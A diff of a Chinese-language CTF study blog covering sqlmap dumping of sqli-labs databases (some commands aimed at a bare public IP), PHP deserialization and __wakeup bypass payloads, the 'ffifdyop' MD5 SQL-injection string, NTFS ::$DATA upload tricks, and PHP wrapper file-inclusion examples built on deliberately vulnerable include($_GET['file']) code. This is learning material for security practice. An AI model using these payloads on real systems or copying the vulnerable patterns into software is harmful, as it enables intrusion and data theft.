-        <h1 id="sqlmap通关sqli-labs"><a href="#sqlmap通关sqli-labs" class="headerlink" title="sqlmap通关sqli-labs"></a>sqlmap通关sqli-labs</h1><h2 id="基础注入"><a href="#基础注入" class="headerlink" title="基础注入"></a>基础注入</h2><blockquote>
-<p>&#x3D;&#x3D;获取用户：&#x3D;&#x3D;​<code>root@localhost</code>​</p>
-<p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 --current-user</code>​</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;获取当前数据库：&#x3D;&#x3D;</p>
-<p>​<code>sqlmap -u http://59.63.200.79:8003/?id=1 --current-db</code>​</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;获取数据库：&#x3D;&#x3D;​<code>ctftraining</code>​</p>
-<p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 --dbs</code>​</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;获取表：&#x3D;&#x3D;​<code>flag、news、users</code></p>
-<p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 -D ctftraining --tables</code>​</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;获取所有字段&#x3D;&#x3D;获取admin表里的字段<br>​<code>sqlmap -u http://59.63.200.79:8003/?id=1 -D maoshe -T admin --columns</code>​</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;获取字段值&#x3D;&#x3D;<br>​<code>sqlmap -u http://59.63.200.79:8003/?id=1 -D maoshe -T admin -C Id,password,username --dump</code>​</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;获取flag：&#x3D;&#x3D;</p>
-<p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 -D ctftraining -T flag --dump</code>​</p>
-</blockquote>
-<p>‍</p>
-<h2 id="POST型注入"><a href="#POST型注入" class="headerlink" title="POST型注入"></a>POST型注入</h2><blockquote>
-<p>使用BP抓包&#x3D;&#x3D;获取post报文&#x3D;&#x3D;，保存在&#x3D;&#x3D;txt文件&#x3D;&#x3D;里、&#x3D;&#x3D;-r代表文档&#x3D;&#x3D;，文档内容就是你的&#x3D;&#x3D;post报文&#x3D;&#x3D; –batch 自动选择yes、<br>获取到我们熟知的关键数据库：ctftraining</p>
-<p>​<code>sqlmap -r post_sqlmap.txt --batch -dbs</code>​</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;获取表：&#x3D;&#x3D;​<code>flag、news、users</code>​</p>
-<p>​<code>sqlmap -r 1.txt --batch -D ctftraining --tables</code>​</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;获取flag：&#x3D;&#x3D;</p>
-<p>​<code>sqlmap -r 1.txt --batch -D ctftraining -T flag --dump</code>​</p>
-</blockquote>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/sqlmap%E9%80%9A%E5%85%B3sqli-labs/" data-id="cmawczpo3002gik7kafsrag2z" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SSTI（模板注入）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SSTI%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="SSTI（模板注入）"><a href="#SSTI（模板注入）" class="headerlink" title="SSTI（模板注入）"></a>SSTI（模板注入）</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">待学习</a></p>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SSTI%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/" data-id="cmawczpo4002hik7kf2di5o4t" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E6%8C%87%E4%BB%A4%E7%BB%95%E8%BF%87/" data-id="cmaxy8gbz0026kg7khetfcaex" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -699,7 +457,235 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" data-id="cmawczpo4002iik7k4f967krz" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" data-id="cmaxy8gbz0029kg7k64no7mr0" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="魔法方法php反序列化知识点总结-Th0r-博客园-cnblogs-com"><a href="#魔法方法php反序列化知识点总结-Th0r-博客园-cnblogs-com" class="headerlink" title="魔法方法php反序列化知识点总结 - Th0r - 博客园 (cnblogs.com)"></a>魔法方法<a target="_blank" rel="noopener" href="https://www.cnblogs.com/th0r/p/14071894.html#0x02-%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95">php反序列化知识点总结 - Th0r - 博客园 (cnblogs.com)</a></h2><p>魔法方法指的是在php执行某个过程或函数时会调用的方法</p>
+<p>​<code>__construct()</code>​：在创建对象时候初始化对象，一般用于对变量赋初值（实例化对象时）。</p>
+<p>​<code>__destruct()</code>​： 和构造函数相反，当对象所在函数调用完毕后执行。（对象引用完成或对象被销毁反序列化之后）</p>
+<p>​<code>__toString()</code>​：当对象被当做一个字符串使用时调用。</p>
+<p>​<code>__invoke()</code>​：把对象当成函数调用</p>
+<p>​<code>__clone</code>​：当使用clone关键字拷贝完成一个对象</p>
+<p>​<code>__sleep()</code>​：序列化对象之前就调用此方法(其返回需要一个数组（序列化unserilize（）之前）</p>
+<p>​<code>__wakeup()</code>​：反序列化恢复对象之前调用该方法（反序列化unserilize（）之前）</p>
+<p>​<code>__call()</code>​：当调用对象中不存在的方法会自动调用该方法。  __callStatic():静态调用或调用成员常量时使用的方法不存在</p>
+<p>​<code>__get()</code>​：在调用私有属性（不存在）的时候会自动执行</p>
+<p>​<code>__set()</code>​：给不存在的成员属性赋值</p>
+<p>​<code>__isset()</code>​：在不可访问的属性上调用isset()或empty()触发</p>
+<p>​<code>__unset()</code>​：在不可访问的属性上使用unset()时触发</p>
+<h3 id="绕过-wakeup​PHP-反序列化基础完全解析-先知社区-aliyun-com"><a href="#绕过-wakeup​PHP-反序列化基础完全解析-先知社区-aliyun-com" class="headerlink" title="绕过 __wakeup​PHP 反序列化基础完全解析 - 先知社区 (aliyun.com)"></a>绕过 <code>__wakeup</code>​<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14667?time__1311=mqmx9QDtDQ0QD=oDsdoYK0=9bkOQ=DcD3D&alichlgref=https://www.bing.com/">PHP 反序列化基础完全解析 - 先知社区 (aliyun.com)</a></h3><p>当反序列化时, 给出的字段个数的数字小于提供的字段个数, 将不会执行 <code>__wakeup</code>​</p>
+<p>例如:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Dino&quot;:1:&#123;s:4:&quot;addr&quot;;s:3:&quot;209&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>改为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Dino&quot;:114514:&#123;s:4:&quot;addr&quot;;s:3:&quot;209&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="反序列化分隔符"><a href="#反序列化分隔符" class="headerlink" title="反序列化分隔符"></a>反序列化分隔符</h2><p>反序列化以;}结束，后面的字符串不影响正常的反序列化</p>
+<h2 id="属性逃逸"><a href="#属性逃逸" class="headerlink" title="属性逃逸"></a>属性逃逸</h2><p>般在数据先经过一次serialize再经过unserialize，在这个中间反序列化的字符串变多或者变少的时候有可能存在反序列化属性逃逸</p>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cmaxy8gbz002ckg7kg41t9woh" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/SSTI（模板注入）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SSTI%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SSTI（模板注入）"><a href="#SSTI（模板注入）" class="headerlink" title="SSTI（模板注入）"></a>SSTI（模板注入）</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">待学习</a></p>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SSTI%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/" data-id="cmaxy8gc0002ekg7k51g8flml" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/绕过/神奇的MD5" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%A5%9E%E5%A5%87%E7%9A%84MD5/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="神奇的MD5"><a href="#神奇的MD5" class="headerlink" title="神奇的MD5"></a>神奇的MD5</h1><h4 id="奇妙的字符串"><a href="#奇妙的字符串" class="headerlink" title="奇妙的字符串"></a>奇妙的字符串</h4><p>一个是MD5加密后弱比较等于自身，这个字符串是 0e215962017 ：</p>
+<p>另一个是 MD5 加密后变成万能密码，这个字符串是 ffifdyop ：</p>
+<blockquote>
+<p>经过md5加密后：276f722736c95d99e921722cf9ed621c<br>再转换为字符串：‘or’6&lt;乱码&gt; 即 ‘or’66�]��!r,��b<br>用途：<br>select * from admin where password=’‘or’6&lt;乱码&gt;’<br>就相当于select * from admin where password=’’or 1 实现sql注入</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;;) &#123; </span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$c</span> = <span class="number">0</span>; <span class="variable">$c</span> &lt; <span class="number">1000000</span>; <span class="variable">$c</span>++, <span class="variable">$i</span>++)</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>, <span class="literal">true</span>), <span class="string">&#x27;\&#x27;or\&#x27;&#x27;</span>) !== <span class="literal">false</span>)</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;\nmd5(<span class="subst">$i</span>) = &quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>, <span class="literal">true</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%A5%9E%E5%A5%87%E7%9A%84MD5/" data-id="cmaxy8gc0002fkg7kcfe2a7yi" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/文件上传/upload-labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p>在· Windows·操作系统中，当你看到文件名后跟着”::$DATA”时，它表示文件的一个附加数据流(Alternate·DataStream，ADS)。数据流是一种用于在文件内部存储额外数据的机制。在普通情况下，我们使用的文件只有一个默认的数据流，可以通过文件名访问。但是Windows·NT·文件系统(NTFS)支持在文件内部创建额外的数据流，以存储其他信息。这些额外的数据流可以通过在文件名后面添加”::$DATA”来访问。<br>例如，”1.txt”是一个文件，而”1.txt:$DATA”是这个文件的一个附加数据流。这样的数据流可以用于存储文件的元数据、备份信息、标签等。<br>需要注意的是，大多数常规的文件操作工具不会意识到这些额外的数据流，而只会处理默认的数据流。要访问或操作这些附加数据流，通常需要使用特定的命令行工具或编程接口</p>
+<p>‍</p>
+<p>‍</p>
+<blockquote>
+<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">写入方法:(命令行)<br>echo·内容·&gt;&gt;文件名:数据流名<br>type· 文件名&gt;&gt;文件名:数据流名<br>查看方法:<br>notepad·文件名:数据流名</span></p>
+</blockquote>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/" data-id="cmaxy8gc1002hkg7kfrbtchlf" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/文件包含/PHP伪协议" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><h1 id="一、前言【文件包含中的伪协议】-文件包含伪协议-CSDN博客"><a href="#一、前言【文件包含中的伪协议】-文件包含伪协议-CSDN博客" class="headerlink" title="一、前言【文件包含中的伪协议】_文件包含伪协议-CSDN博客"></a>一、前言<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45131319/article/details/138420946?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~baidujs_baidulandingword~Ctr-1-138420946-blog-136493198.235%5Ev43%5Epc_blog_bottom_relevance_base6&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~baidujs_baidulandingword~Ctr-1-138420946-blog-136493198.235%5Ev43%5Epc_blog_bottom_relevance_base6&utm_relevant_index=1">【文件包含中的伪协议】_文件包含伪协议-CSDN博客</a></h1><h2 id="1-什么是PHP伪协议？"><a href="#1-什么是PHP伪协议？" class="headerlink" title="1.什么是PHP伪协议？"></a>1.什么是PHP伪协议？</h2><p>PHP伪协议是PHP自己支持的一种协议与封装协议，简单来说就是PHP定义的一种特殊访问资源的方法。</p>
+<p>有些伪协议成功执行需要allow_url_fopen和allow_url_include的支持。</p>
+<p>allow_url_fopen On&#x2F;Off 允许或禁止打开URL文件<br>allow_url_include On&#x2F;Off 允许或禁止引用URL文件</p>
+<p>‍</p>
+<h2 id="2-什么时候用PHP伪协议"><a href="#2-什么时候用PHP伪协议" class="headerlink" title="2.什么时候用PHP伪协议?"></a>2.什么时候用PHP伪协议?</h2><p>文件包含！！！的时候，可能遇到的文件包含函数：<br>1、include<br>2、require<br>3、include_once<br>4、require_once<br>5、highlight_file<br>6、show_source<br>7、flie<br>8、readfile<br>9、file_get_contents<br>10、file_put_contents<br>11、fopen (比较常见)</p>
+<p>‍</p>
+<h1 id="二、常见的php伪协议"><a href="#二、常见的php伪协议" class="headerlink" title="二、常见的php伪协议"></a>二、常见的php伪协议</h1><p>php:&#x2F;&#x2F;input<br>php:&#x2F;&#x2F;input 是个可以访问请求的原始数据的只读流，获取POST请求数据的协议</p>
+<p>当enctype&#x3D;”multipart&#x2F;form-data” 的时候 php:&#x2F;&#x2F;input 是无效的。</p>
+<p>php:&#x2F;&#x2F;input 伪协议 成功执行前提<br>php.ini 中的 allow_url_include设置为On</p>
+<p>格式示例：  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">@<span class="built_in">include</span>($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>php:&#x2F;&#x2F;filter<br>php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
+<p>在利用上很多都是与包含函数结合使用，读入或者输出获取文件源码然后编码让其不执行从而输出</p>
+<p>php:&#x2F;&#x2F;filter 的使用：<br>如<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php<br>php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php</p>
+<p>php:&#x2F;&#x2F;filter 伪协议组成：<br>read&#x3D;&lt;读链的筛选列表&gt;<br>resource&#x3D;&lt;要过滤的数据流&gt;<br>write&#x3D;&lt;写链的筛选列表&gt;<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;处理方式（base64编码，rot13等等）&#x2F;resource&#x3D;要读取的文件</p>
+<p>read 对应要设置的过滤器：<br>常见的过滤器分字符串过滤器、转换过滤器、压缩过滤器、加密过滤器<br>其中convert.base64-encode ，convert.base64-decode都属于 转换过滤器</p>
+<p>格式示例：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="built_in">echo</span>(<span class="built_in">file_get_contents</span>($a));<span class="comment">//获取文件内容</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议<br>zip:&#x2F;&#x2F; 等属于压缩流的协议，通过直接压缩普通文件为zip文件，再通过zip:&#x2F;&#x2F; 协议读取，可以直接执行php代码。压缩后的zip文件可以随意修改后缀也不影响zip:&#x2F;&#x2F;协议读取。（注意是如phpinfo.txt直接压缩为zip,而不是文件夹压缩zip）</p>
+<p>格式示例：  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="built_in">include</span>($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议<br>zip:&#x2F;&#x2F; 等属于压缩流的协议，通过直接压缩普通文件为zip文件，再通过zip:&#x2F;&#x2F; 协议读取，可以直接执行php代码。压缩后的zip文件可以随意修改后缀也不影响zip:&#x2F;&#x2F;协议读取。（注意是如phpinfo.txt直接压缩为zip,而不是文件夹压缩zip）</p>
+<p>格式示例：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="built_in">include</span>($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>压缩及协议访问格式：</p>
+<p>压缩文件为.zip后缀<br>zip:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip%23phpinfo.php<br>压缩文件为.bz2后缀<br>compress.bzip2:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php<br>压缩文件为.gz后缀<br>compress.zlib:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php</p>
+<p>data:&#x2F;&#x2F;<br>data:&#x2F;&#x2F;伪协议可以通过请求提交的php代码数据配合文件包含函数可以达到代码执行效果。</p>
+<p>data:&#x2F;&#x2F;伪协议 成功执行前提<br>php.ini设置allow_url_include 与allow_url_open都为On。</p>
+<p>data:&#x2F;&#x2F;协议的格式是: data:&#x2F;&#x2F;数据流封装器,相应格式数据</p>
+<p>格式示例：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="built_in">include</span>($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><p>phar:&#x2F;&#x2F;伪协议可以对zip格式压缩包进行访问解析</p>
+<p>格式示例：</p>
+<blockquote>
+<p>phar:&#x2F;&#x2F;绝对路径\phpinfo.zip\phpinfo.php</p>
+</blockquote>
+<p>注意这里与zip:&#x2F;&#x2F;不同的地方是，phar访问压缩包内容是通过&#x2F;访问，而zip是通过#访问</p>
+<blockquote>
+<p>使用这些伪协议时，需要注意PHP配置和服务器环境的限制，某些协议可能因为配置或安全原因被禁用。<br>特别是在处理外部资源（如HTTP或FTP）时，需要注意安全性，确保不会暴露敏感信息或遭受注入攻击。<br>在使用 data:&#x2F;&#x2F;、phar:&#x2F;&#x2F; 等伪协议时，应特别注意数据的验证和清洁，以避免安全漏洞。</p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="cmaxy8gc1002ikg7k9usb5cyu" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -772,19 +758,19 @@
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
-          </li>
-        
-          <li>
             <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">(no title)</a>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/">(no title)</a>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/">(no title)</a>
           </li>
         
       </ul>
